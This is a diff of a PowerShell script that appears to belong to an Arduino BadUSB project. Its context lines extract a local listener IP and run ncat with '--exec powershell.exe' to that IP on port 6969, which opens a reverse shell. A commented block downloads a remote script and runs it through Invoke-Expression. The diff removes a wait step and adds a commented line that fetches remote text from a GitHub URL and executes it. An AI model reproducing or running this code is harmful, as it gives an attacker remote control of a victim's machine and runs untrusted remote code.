@@ -26,12 +26,6 @@ $string = $ScanOutput -match "192\.168\.1\.\w+"
 $ListenerIP = $string.Substring(21)
 Write-Output "IP Extracted"
 
-# wait a while
-Write-Output "Waiting"
-Start-Sleep -Seconds 5
-Write-Output "Wait Finished"
-
-
 # connect to listener
 Write-Output "Connecting to listener"
 .\ncat.exe -C --exec "powershell.exe" $ListenerIP 6969
@@ -41,4 +35,7 @@ Set-ExecutionPolicy Bypass -Scope Process -Force;
 [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072;
 Invoke-Expression "&{$((New-Object System.Net.WebClient).DownloadString('https://gist.github.com/MadeBaruna/1d75c1d37d19eca71591ec8a31178235/raw/getlink.ps1'))} global"
 #>
+
+# run command on arduino
+#powershell Invoke-Expression -Command (Invoke-WebRequest -Uri https://raw.githubusercontent.com/h3xagon0001/arduino-micro-badusb/refs/heads/main/test.txt); powershell
 
